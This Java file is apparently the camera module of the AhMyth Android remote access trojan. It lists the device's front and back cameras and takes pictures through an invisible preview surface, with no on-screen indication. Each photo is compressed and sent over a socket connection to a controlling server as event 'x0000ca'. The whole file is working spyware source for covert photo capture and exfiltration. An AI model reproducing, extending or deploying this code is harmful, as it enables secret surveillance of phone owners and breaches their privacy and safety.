package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.os.Build;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class CameraManager {
    private static final String TAG = "CameraManager";
    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        this.context = context;
        Log.i(TAG, "CameraManager initialized");
    }

    private boolean hasCameraPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            boolean hasPermission = ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
            Log.i(TAG, "hasCameraPermission (Android 6+): " + hasPermission);
            return hasPermission;
        }
        Log.i(TAG, "hasCameraPermission (Android <6): true");
        return true;
    }

    public void startUp(int cameraID) {
        Log.i(TAG, "startUp called with cameraID: " + cameraID);
        
        if (!hasCameraPermission()) {
            Log.e(TAG, "CAMERA permission not granted!");
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "CAMERA permission not granted");
            } catch (JSONException e) {
                Log.e(TAG, "Error creating JSON response", e);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
            return;
        }

        try {
            Log.i(TAG, "Opening camera " + cameraID);
            camera = Camera.open(cameraID);
            Log.i(TAG, "Camera opened successfully");
            
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);
            
            Log.i(TAG, "Setting preview texture");
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
            Log.i(TAG, "Preview started, taking picture");

            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    Log.i(TAG, "Picture taken! Data size: " + data.length);
                    releaseCamera();
                    sendPhoto(data);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Camera error: " + e.getMessage(), e);
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "Camera error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creating error JSON", ee);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
        }
    }

    private void sendPhoto(byte[] data) {
        Log.i(TAG, "sendPhoto called with data size: " + data.length);
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap == null) {
                Log.e(TAG, "Failed to decode bitmap from camera data");
                return;
            }
            
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
            byte[] jpegData = bos.toByteArray();
            Log.i(TAG, "JPEG compressed size: " + jpegData.length);

            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", jpegData);
            
            Log.i(TAG, "Emitting photo to server");
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
            Log.i(TAG, "Photo emitted successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error sending photo: " + e.getMessage(), e);
            JSONObject resp = new JSONObject();
            try {
                resp.put("image", false);
                resp.put("error", "Image error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creating error JSON", ee);
            }
            IOSocket.getInstance().getIoSocket().emit("x0000ca", resp);
        }
    }

    private void releaseCamera() {
        Log.i(TAG, "Releasing camera");
        if (camera != null) {
            try {
                camera.stopPreview();
            } catch (Exception e) {
                Log.w(TAG, "Error stopping preview", e);
            }
            camera.release();
            camera = null;
        }
    }

    public JSONObject findCameraList() {
        Log.i(TAG, "findCameraList called");
        JSONObject cameras = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
                Log.w(TAG, "No camera feature available");
                cameras.put("camList", false);
                cameras.put("list", list);
                return cameras;
            }

            cameras.put("camList", true);

            int numberOfCameras = Camera.getNumberOfCameras();
            Log.i(TAG, "Number of cameras: " + numberOfCameras);
            
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                JSONObject jo = new JSONObject();
                switch (info.facing) {
                    case Camera.CameraInfo.CAMERA_FACING_FRONT:
                        jo.put("name", "Front");
                        break;
                    case Camera.CameraInfo.CAMERA_FACING_BACK:
                        jo.put("name", "Back");
                        break;
                    default:
                        jo.put("name", "Other");
                        break;
                }
                jo.put("id", i);
                list.put(jo);
            }

            cameras.put("list", list);
            Log.i(TAG, "Camera list: " + cameras.toString());
            return cameras;

        } catch (JSONException e) {
            Log.e(TAG, "JSON error in findCameraList", e);
            try {
                cameras.put("camList", false);
                cameras.put("error", "Error: " + e.getMessage());
            } catch (JSONException ee) {
                Log.e(TAG, "Error creating error JSON", ee);
            }
            return cameras;
        }
    }
}